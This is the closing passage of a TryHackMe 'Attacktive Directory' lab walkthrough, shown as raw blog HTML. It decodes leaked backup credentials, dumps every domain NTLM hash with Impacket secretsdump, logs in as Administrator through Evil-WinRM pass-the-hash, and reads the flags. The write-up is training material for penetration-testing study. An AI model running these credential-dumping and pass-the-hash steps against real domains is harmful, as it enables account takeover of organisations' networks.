getting file \backup_credentials.txt of size 48 as backup_credentials.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
</pre></table></code></div></div><h3 id="what-is-the-content-of-the-file">What is the content of the file?</h3><p><code class="language-plaintext highlighter-rouge">YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw</code></p><h3 id="decoding-the-contents-of-the-file-what-is-the-full-contents">Decoding the contents of the file, what is the full contents?</h3><p><code class="language-plaintext highlighter-rouge">backup@spookysec.local:backup2517860</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="https://amirr0r.github.io/assets/img/thm/windows/attackive-directory/backup_credentials.png" alt="backup_credentials.txt" /></p><hr /><h2 id="elevating-privileges-within-the-domain">Elevating Privileges within the Domain</h2><blockquote><p>Now that we have new user account credentials, we may have more privileges on the system than before.</p></blockquote><p>Knowing this, we can use another tool within Impacket called “<code class="language-plaintext highlighter-rouge">secretsdump.py</code>”. This will allow us to retrieve all of the password hashes that this user account (that is synced with the domain controller) has to offer. Exploiting this, we will effectively have full control over the AD Domain.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre><span class="nv">$ </span>python3 /usr/local/bin/secretsdump.py <span class="nt">-just-dc-ntlm</span> spookysec.local/backup:backup2517860@<span class="nv">$TARGET</span>
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Dumping Domain Credentials <span class="o">(</span>domain<span class="se">\u</span><span class="nb">id</span>:rid:lmhash:nthash<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
spookysec.local<span class="se">\s</span>kidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local<span class="se">\b</span>reakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local<span class="se">\j</span>ames:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::
spookysec.local<span class="se">\o</span>ptional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::
spookysec.local<span class="se">\s</span>herlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::
spookysec.local<span class="se">\d</span>arkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::
spookysec.local<span class="se">\O</span>ri:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::
spookysec.local<span class="se">\r</span>obin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::
spookysec.local<span class="se">\p</span>aradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::
spookysec.local<span class="se">\M</span>uirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::
spookysec.local<span class="se">\h</span>orshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::
spookysec.local<span class="se">\s</span>vc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
spookysec.local<span class="se">\b</span>ackup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
spookysec.local<span class="se">\a</span><span class="nt">-spooks</span>:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
ATTACKTIVEDIREC<span class="nv">$:</span>1000:aad3b435b51404eeaad3b435b51404ee:0942ad72c183935a736ea0a211fabdec:::
</pre></table></code></div></div><h3 id="what-method-allowed-us-to-dump-ntdsdit">What method allowed us to dump NTDS.DIT?</h3><p><code class="language-plaintext highlighter-rouge">DRSUAPI</code></p><h3 id="what-is-the-administrators-ntlm-hash">What is the Administrators NTLM hash?</h3><p><code class="language-plaintext highlighter-rouge">0e0363213e37b94221497260b0bcb4fc</code></p><h3 id="what-method-of-attack-could-allow-us-to-authenticate-as-the-user-without-the-password">What method of attack could allow us to authenticate as the user without the password?</h3><p><a href="https://beta.hackndo.com/pass-the-hash/"><strong>Pass The Hash</strong></a></p><h3 id="using-a-tool-called-evil-winrm-what-option-will-allow-us-to-use-a-hash">Using a tool called Evil-WinRM what option will allow us to use a hash?</h3><p><code class="language-plaintext highlighter-rouge">-H</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>root@kali:~/thm/attackive-directory# evil-winrm <span class="nt">-i</span> <span class="nv">$TARGET</span> <span class="nt">-u</span> Administrator <span class="nt">-H</span> 0e0363213e37b94221497260b0bcb4fc

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

<span class="o">[</span>0<span class="p">;</span>31m<span class="k">*</span>Evil-WinRM<span class="k">*</span><span class="o">[</span>0m[0<span class="p">;</span>1<span class="p">;</span>33m PS <span class="o">[</span>0mC:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
</span>thm-ad<span class="se">\a</span>dministrator
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="https://amirr0r.github.io/assets/img/thm/windows/attackive-directory/secretsdump.png" alt="secretsdump" /></p><hr /><h2 id="flag-submission-panel">Flag Submission Panel</h2><h3 id="svc-admin">svc-admin</h3><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="p">[</span><span class="mi">0</span><span class="p">;</span><span class="mi">31</span><span class="n">m</span><span class="o">*</span><span class="nx">Evil-WinRM</span><span class="o">*</span><span class="p">[</span><span class="n">0m</span><span class="p">[</span><span class="mi">0</span><span class="p">;</span><span class="mi">1</span><span class="p">;</span><span class="mi">33</span><span class="n">m</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="p">[</span><span class="mi">0</span><span class="n">mC</span><span class="p">:</span><span class="n">\Users\svc-admin\Desktop</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">dir</span><span class="w">


    </span><span class="n">Directory</span><span class="p">:</span><span class="w"> </span><span class="n">C:\Users\svc-admin\Desktop</span><span class="w">


</span><span class="n">Mode</span><span class="w">                </span><span class="n">LastWriteTime</span><span class="w">         </span><span class="n">Length</span><span class="w"> </span><span class="n">Name</span><span class="w">
</span><span class="o">----</span><span class="w">                </span><span class="o">-------------</span><span class="w">         </span><span class="o">------</span><span class="w"> </span><span class="o">----</span><span class="w">
</span><span class="nt">-a</span><span class="o">----</span><span class="w">         </span><span class="mi">4</span><span class="n">/4/2020</span><span class="w">  </span><span class="nx">12:18</span><span class="w"> </span><span class="nx">PM</span><span class="w">             </span><span class="nx">28</span><span class="w"> </span><span class="nx">user.txt.txt</span><span class="w">


</span><span class="p">[</span><span class="mi">0</span><span class="p">;</span><span class="mi">31</span><span class="n">m</span><span class="o">*</span><span class="nx">Evil-WinRM</span><span class="o">*</span><span class="p">[</span><span class="n">0m</span><span class="p">[</span><span class="mi">0</span><span class="p">;</span><span class="mi">1</span><span class="p">;</span><span class="mi">33</span><span class="n">m</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="p">[</span><span class="mi">0</span><span class="n">mC</span><span class="p">:</span><span class="n">\Users\svc-admin\Desktop</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">type</span><span class="w"> </span><span class="nx">user.txt.txt</span><span class="w">
</span><span class="n">TryHackMe</span><span class="p">{</span><span class="n">K3rb3r0s_Pr3_4uth</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><h3 id="backup">backup</h3><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\backup\Desktop&gt; dir


    Directory: C:\Users\backup\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         4/4/2020  12:19 PM             26 PrivEsc.txt


[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\backup\Desktop&gt; type PrivEsc.txt
TryHackMe{B4ckM3UpSc0tty!}
</pre></table></code></div></div><h3 id="administrator">Administrator</h3><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="p">[</span><span class="mi">0</span><span class="p">;</span><span class="mi">31</span><span class="n">m</span><span class="o">*</span><span class="nx">Evil-WinRM</span><span class="o">*</span><span class="p">[</span><span class="n">0m</span><span class="p">[</span><span class="mi">0</span><span class="p">;</span><span class="mi">1</span><span class="p">;</span><span class="mi">33</span><span class="n">m</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="p">[</span><span class="mi">0</span><span class="n">mC</span><span class="p">:</span><span class="n">\Users\Administrator\Desktop</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">dir</span><span class="w">                                                                                      
                                                                                                                                                             
                                                                                                                                                             
    </span><span class="n">Directory</span><span class="p">:</span><span class="w"> </span><span class="n">C:\Users\Administrator\Desktop</span><span class="w">                                                                                                                
                                                                                                                                                             
                                                                                                                                                             
</span><span class="n">Mode</span><span class="w">                </span><span class="n">LastWriteTime</span><span class="w">         </span><span class="n">Length</span><span class="w"> </span><span class="n">Name</span><span class="w">                                                                                                        
</span><span class="o">----</span><span class="w">                </span><span class="o">-------------</span><span class="w">         </span><span class="o">------</span><span class="w"> </span><span class="o">----</span><span class="w">                                                                                                        
</span><span class="nt">-a</span><span class="o">----</span><span class="w">         </span><span class="mi">4</span><span class="n">/4/2020</span><span class="w">  </span><span class="nx">11:39</span><span class="w"> </span><span class="nx">AM</span><span class="w">             </span><span class="nx">32</span><span class="w"> </span><span class="nx">root.txt</span><span class="w">                                                                                                    
                                                                                                                                                             
</span><span class="p">[</span><span class="mi">0</span><span class="p">;</span><span class="mi">31</span><span class="n">m</span><span class="o">*</span><span class="nx">Evil-WinRM</span><span class="o">*</span><span class="p">[</span><span class="n">0m</span><span class="p">[</span><span class="mi">0</span><span class="p">;</span><span class="mi">1</span><span class="p">;</span><span class="mi">33</span><span class="n">m</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="p">[</span><span class="mi">0</span><span class="n">mC</span><span class="p">:</span><span class="n">\Users\Administrator\Desktop</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">type</span><span class="w"> </span><span class="nx">root.txt</span><span class="w">
</span><span class="n">TryHackMe</span><span class="p">{</span><span class="mi">4</span><span class="n">ctiveD1rectoryM4st3r</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><hr /><h2 id="tools">Tools</h2><ul><li><a href="https://github.com/ropnop/kerbrute/releases">Kerbrute</a></li><li><a href="https://github.com/SecureAuthCorp/impacket">impacket</a></li></ul><hr /><h2 id="useful-links">Useful links</h2><ul><li><a href="https://www.youtube.com/playlist?list=PL3B8L-z5QU-Z0bWmjwgUSLGTzm1k_kVZo">VbScrub - Kerberos playlist</a></li><li><a href="https://beta.hackndo.com/kerberos-asrep-roasting/">Hackndo - AS-REP Roasting</a></li><li><a href="https://github.com/amirr0r/notes/blob/master/Infosec/boot2root-cheatsheet.md#kerberos">My Boot2root cheatsheet - Kerberos</a></li><li><a href="https://blog.spookysec.net/kerberos-abuse/">Quering and Cracking Kerberos Tickets!</a></li></ul></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/tryhackme-walkthroughs/'>TryHackMe walkthroughs</a>, <a href='/categories/windows/'>Windows</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/thm-windows/" class="post-tag no-text-decoration" >thm-windows</a> <a href="/tags/oscp-prep/" class="post-tag no-text-decoration" >oscp-prep</a> <a href="/tags/active-directory/" class="post-tag no-text-decoration" >Active Directory</a> <a href="/tags/domain-controller/" class="post-tag no-text-decoration" >Domain Controller</a> <a href="/tags/kerberos/" class="post-tag no-text-decoration" >Kerberos</a> <a href="/tags/kerbrute/" class="post-tag no-text-decoration" >kerbrute</a> <a href="/tags/ldapsearch/" class="post-tag no-text-decoration" >ldapsearch</a> <a href="/tags/smbclient/" class="post-tag no-text-decoration" >smbclient</a> <a href="/tags/as-rep-roasting/" class="post-tag no-text-decoration" >AS-REP Roasting</a> <a href="/tags/impacket/" class="post-tag no-text-decoration" >Impacket</a> <a href="/tags/drsuapi/" class="post-tag no-text-decoration" >DRSUAPI</a> <a href="/tags/evil-winrm/" class="post-tag no-text-decoration" >Evil-WinRM</a> <a href="/tags/pass-the-hash/" class="post-tag no-text-decoration" >Pass The Hash</a> <a href="/tags/password-cracking/" class="post-tag no-text-decoration" >password cracking</a> <a href="/tags/hashcat/" class="post-tag no-text-decoration" >hashcat</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><!-- Post sharing snippet v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=TryHackMe - Attackive directory - amirr0r&url=https://amirr0r.github.io/posts/thm-attackive-directory/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=TryHackMe - Attackive directory - amirr0r&u=https://amirr0r.github.io/posts/thm-attackive-directory/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=TryHackMe - Attackive directory - amirr0r&url=https://amirr0r.github.io/posts/thm-attackive-directory/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><!-- The Pannel on right side (Desktop views) v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"><h3 data-toc-skip>Recent Update</h3><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/crto-review/">CRTO Review (Certified Red Team Operator) & Notion Templates</a></li><li><a href="/posts/htb-forest/">HackTheBox - Forest</a></li><li><a href="/posts/oscp-review/">OSCP Review (Cheat Sheet, Tmux Enumeration Scripts and Notion Templates)</a></li><li><a href="/posts/oscp-prep/">How do I prepare for the OSCP?</a></li><li><a href="/posts/htb-valentine/">HackTheBox - Valentine</a></li></ul></div><div id="access-tags"><h3 data-toc-skip>Trending Tags</h3><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/msfvenom/">msfvenom</a> <a class="post-tag" href="/tags/sudo-misconfiguration/">sudo misconfiguration</a> <a class="post-tag" href="/tags/password-cracking/">password cracking</a> <a class="post-tag" href="/tags/pwn/">pwn</a> <a class="post-tag" href="/tags/meterpreter/">meterpreter</a> <a class="post-tag" href="/tags/gobuster/">gobuster</a> <a class="post-tag" href="/tags/gtfobins/">GTFOBins</a> <a class="post-tag" href="/tags/searchsploit/">searchsploit</a> <a class="post-tag" href="/tags/john-the-ripper/">John The Ripper</a> <a class="post-tag" href="/tags/powershell/">powershell</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><h3 data-toc-skip class="pl-3 pt-2 mb-2">Contents</h3><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <!-- Recommend the other 3 posts according to the tags and categories of the current post, if the number is not enough, use the other latest posts to supplement. v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/htb-forest/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Sep 6, 2021 <i class="unloaded">2021-09-06T19:47:54+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox - Forest</h3><div class="text-muted small"><p> Forest is an easy HackTheBox virtual machine acting as a Windows Domain Controller (DC) in which Exchange Server has been installed. Anonymous LDAP binds are allowed, which we will use to enumerat...</p></div></div></a></div><div class="card"> <a href="/posts/thm-windows-post-exploitation-basics/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Jun 28, 2021 <i class="unloaded">2021-06-28T20:27:55+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>TryHackMe - Windows Post-exploitation basics</h3><div class="text-muted small"><p> This room from TryHackMe cover some basic tools used during Windows Post-exploitation such as PowerView, Bloodhound and mimikatz. 1 2 3 4 5 6 7 # RDP xfreerdp /u:&lt;USER&gt; /p:&lt;PASSWORD&gt; /...</p></div></div></a></div><div class="card"> <a href="/posts/htb-active/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Sep 8, 2021 <i class="unloaded">2021-09-08T16:55:12+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox - Active</h3><div class="text-muted small"><p> Enumeration nmap scan 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 $ nmap -min-rate 5000 --max-retries 1 -sV -sC -p- -oN...</p></div></div></a></div></div></div><!-- Navigation buttons at the bottom of the post. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --><div class="post-navigation d-flex justify-content-between"> <a href="/posts/oscp-prep/" class="btn btn-outline-primary"><p>How do I prepare for the OSCP?</p></a> <a href="/posts/cyber-apocalypse-ctf-minefield/" class="btn btn-outline-primary"><p>Cyber Apocalypse CTF 2021 - Minefield (Pwn)</p></a></div><!-- The Disqus lazy loading. Powered by: https://osvaldas.info/lazy-loading-disqus-comments v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung MIT License --><div id="disqus" class="pt-2 pb-2"><p class="font-italic text-center text-muted small"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script src="/assets/js/lib/jquery.disqusloader.min.js"></script> <script> var options = { scriptUrl: '//amirr0r-github-io.disqus.com/embed.js', disqusConfig: function() { this.page.url = 'https://amirr0r.github.io/posts/thm-attackive-directory/'; this.page.identifier = '/posts/thm-attackive-directory/'; } }; $.disqusLoader('#disqus', options); </script></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script> <!-- The Footer v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://github.com/amirr0r">amirr0r</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div></div></footer></div><!-- The Search results v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/msfvenom/">msfvenom</a> <a class="post-tag" href="/tags/sudo-misconfiguration/">sudo misconfiguration</a> <a class="post-tag" href="/tags/password-cracking/">password cracking</a> <a class="post-tag" href="/tags/pwn/">pwn</a> <a class="post-tag" href="/tags/meterpreter/">meterpreter</a> <a class="post-tag" href="/tags/gobuster/">gobuster</a> <a class="post-tag" href="/tags/gtfobins/">GTFOBins</a> <a class="post-tag" href="/tags/searchsploit/">searchsploit</a> <a class="post-tag" href="/tags/john-the-ripper/">John The Ripper</a> <a class="post-tag" href="/tags/powershell/">powershell</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <!-- The GA snippet v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --> <script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','https://www.google-analytics.com/analytics.js','ga'); ga('create', '', 'auto'); ga('send', 'pageview'); </script> <!-- Jekyll Simple Search loader v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://amirr0r.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
